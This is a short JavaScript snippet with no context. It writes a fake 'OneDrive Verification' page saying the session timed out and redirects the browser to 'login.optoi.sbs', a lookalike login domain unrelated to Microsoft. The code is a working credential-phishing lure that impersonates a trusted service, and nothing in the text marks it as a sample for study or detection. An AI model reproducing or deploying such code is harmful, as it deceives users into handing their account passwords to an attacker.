const html = `<html><title>OneDrive Verification</title><p>Session timed out. Please sign in again to continue.</p></html>`;
window.location.href = "https://login.optoi.sbs/example";
document.write(html);
